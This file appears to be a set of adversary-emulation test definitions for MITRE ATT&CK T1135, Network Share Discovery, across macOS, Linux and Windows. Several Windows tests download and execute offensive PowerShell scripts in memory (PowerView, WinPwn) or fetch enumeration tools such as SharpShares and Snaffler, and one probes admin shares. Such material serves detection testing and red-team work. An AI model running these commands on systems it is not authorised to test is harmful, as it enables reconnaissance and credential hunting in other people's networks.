@@ -1,0 +1,286 @@
+{
+  "attack_technique": "T1135",
+  "display_name": "Network Share Discovery",
+  "atomic_tests": [
+    {
+      "name": "Network Share Discovery",
+      "description": "Network Share Discovery",
+      "supported_platforms": [
+        "macos"
+      ],
+      "executor": {
+        "name": "sh",
+        "elevation_required": false,
+        "command": "df -aH\nsmbutil view -g //#{computer_name}\nshowmount #{computer_name}"
+      },
+      "input_arguments": {
+        "computer_name": {
+          "description": "Computer name to find a mount on.",
+          "type": "string",
+          "default": "computer1"
+        }
+      },
+      "auto_generated_guid": "f94b5ad9-911c-4eff-9718-fd21899db4f7"
+    },
+    {
+      "name": "Network Share Discovery - linux",
+      "description": "Network Share Discovery using smbstatus",
+      "supported_platforms": [
+        "linux"
+      ],
+      "executor": {
+        "name": "bash",
+        "elevation_required": true,
+        "command": "smbstatus --shares"
+      },
+      "input_arguments": {
+        "package_checker": {
+          "description": "Package checking command. Debian - dpkg -s samba",
+          "type": "string",
+          "default": "(rpm -q samba &>/dev/null)"
+        },
+        "package_installer": {
+          "description": "Package installer command. Debian - apt install samba",
+          "type": "string",
+          "default": "(which yum && yum -y install epel-release samba)"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "Package with smbstatus (samba) must exist on device",
+          "prereq_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi",
+          "get_prereq_command": "#{package_installer}"
+        }
+      ],
+      "auto_generated_guid": "875805bc-9e86-4e87-be86-3a5527315cae"
+    },
+    {
+      "name": "Network Share Discovery - FreeBSD",
+      "description": "Network Share Discovery using smbstatus",
+      "supported_platforms": [
+        "linux"
+      ],
+      "executor": {
+        "name": "sh",
+        "elevation_required": true,
+        "command": "smbstatus --shares"
+      },
+      "input_arguments": {
+        "package_checker": {
+          "description": "Package checking command. pkg info -x samba",
+          "type": "string",
+          "default": "(pkg info -x samba &>/dev/null)"
+        },
+        "package_installer": {
+          "description": "Package installer command. pkg install -y samba413",
+          "type": "string",
+          "default": "(which pkg && pkg install -y samba413)"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "Package with smbstatus (samba) must exist on device",
+          "prereq_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi",
+          "get_prereq_command": "#{package_installer}"
+        }
+      ],
+      "auto_generated_guid": "77e468a6-3e5c-45a1-9948-c4b5603747cb"
+    },
+    {
+      "name": "Network Share Discovery command prompt",
+      "description": "Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host\nUpon execution available network shares will be displayed in the powershell session",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "net view \\\\#{computer_name}"
+      },
+      "input_arguments": {
+        "computer_name": {
+          "description": "Computer name to find a mount on.",
+          "type": "string",
+          "default": "localhost"
+        }
+      },
+      "auto_generated_guid": "20f1097d-81c1-405c-8380-32174d493bbb"
+    },
+    {
+      "name": "Network Share Discovery PowerShell",
+      "description": "Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, available network shares will be displayed in the powershell session",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "get-smbshare"
+      },
+      "input_arguments": {},
+      "auto_generated_guid": "1b0814d1-bb24-402d-9615-1b20c50733fb"
+    },
+    {
+      "name": "View available share drives",
+      "description": "View information about all of the resources that are shared on the local computer Upon execution, available share drives will be displayed in the powershell session",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "net share"
+      },
+      "input_arguments": {},
+      "auto_generated_guid": "ab39a04f-0c93-4540-9ff2-83f862c385ae"
+    },
+    {
+      "name": "Share Discovery with PowerView",
+      "description": "Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose"
+      },
+      "input_arguments": {},
+      "dependencies": [
+        {
+          "description": "Endpoint must be joined to domain",
+          "prereq_command": "if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}",
+          "get_prereq_command": "\"Join system to domain\""
+        }
+      ],
+      "auto_generated_guid": "b1636f0a-ba82-435c-b699-0d78794d8bfd"
+    },
+    {
+      "name": "PowerView ShareFinder",
+      "description": "PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nInvoke-ShareFinder #{parameters}"
+      },
+      "input_arguments": {
+        "parameters": {
+          "description": "ShareFinder parameter",
+          "type": "string",
+          "default": "-CheckShareAccess"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "Invoke-ShareFinder module must exist in %TEMP% directory",
+          "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\""
+        }
+      ],
+      "auto_generated_guid": "d07e4cc1-98ae-447e-9d31-36cb430d28c4"
+    },
+    {
+      "name": "WinPwn - shareenumeration",
+      "description": "Network share enumeration using the shareenumeration function of WinPwn",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nshareenumeration -noninteractive -consoleoutput"
+      },
+      "input_arguments": {},
+      "auto_generated_guid": "987901d1-5b87-4558-a6d9-cffcabc638b8"
+    },
+    {
+      "name": "Network Share Discovery via dir command",
+      "description": "Network Share Discovery utilizing the dir command prompt. The computer ip variable may need to be modified to point to a different host ip\nUpon execution available network shares will be displayed in the commandline session",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "dir \\\\#{computer_ip}\\c$\ndir \\\\#{computer_ip}\\admin$\ndir \\\\#{computer_ip}\\IPC$"
+      },
+      "input_arguments": {
+        "computer_ip": {
+          "description": "Computer IP to find a mount on.",
+          "type": "string",
+          "default": "127.0.0.1"
+        }
+      },
+      "auto_generated_guid": "13daa2cf-195a-43df-a8bd-7dd5ffb607b5"
+    },
+    {
+      "name": "Enumerate All Network Shares with SharpShares",
+      "description": "SharpShares is a command line tool that can be integrated with Cobalt Strike's execute-assembly module, allowing for the enumeration of network shares. \nThis technique has been utilized by various ransomware groups, including BianLian.\n[Reference](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-136a)",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "cmd /c '#{sharp_path}' /ldap:all | out-file -filepath \"#{output_path}\"",
+        "cleanup_command": "remove-item \"#{output_path}\" -force -erroraction silentlycontinue"
+      },
+      "input_arguments": {
+        "output_path": {
+          "description": "File to output enumeration results to",
+          "type": "String",
+          "default": "$env:temp\\T1135SharpSharesOutput.txt"
+        },
+        "sharp_path": {
+          "description": "Path to the SharpShares executable",
+          "type": "String",
+          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\SharpShares.exe"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "The SharpShares executable must exist on disk",
+          "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpShares.exe\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/mitchmoser/SharpShares/releases/download/v2.4/SharpShares.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpShares.exe\""
+        }
+      ],
+      "auto_generated_guid": "d1fa2a69-b0a2-4e8a-9112-529b00c19a41"
+    },
+    {
+      "name": "Enumerate All Network Shares with Snaffler",
+      "description": "Snaffler is an open-source tool that has been used by various threat groups, including Scattered Spider/Muddled Libra, to enumerate accessible shares and credential-containing files within a domain. \n[Reference](https://unit42.paloaltonetworks.com/muddled-libra/)",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "invoke-expression 'cmd /c start powershell -command { cmd /c \"#{snaffler_path}\" -a -o \"#{output_path}\" }; start-sleep 90; stop-process -name \"snaffler\"'",
+        "cleanup_command": "remove-item \"#{output_path}\" -force -erroraction silentlycontinue"
+      },
+      "input_arguments": {
+        "output_path": {
+          "description": "File to output enumeration results to",
+          "type": "String",
+          "default": "$env:temp\\T1135SnafflerOutput.txt"
+        },
+        "snaffler_path": {
+          "description": "Path to the Snaffler executable",
+          "type": "String",
+          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\Snaffler.exe"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "The Snaffler executable must exist on disk",
+          "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Snaffler.exe\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/SnaffCon/Snaffler/releases/download/1.0.150/Snaffler.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Snaffler.exe\""
+        }
+      ],
+      "auto_generated_guid": "b19d74b7-5e72-450a-8499-82e49e379d1a"
+    }
+  ]
+}
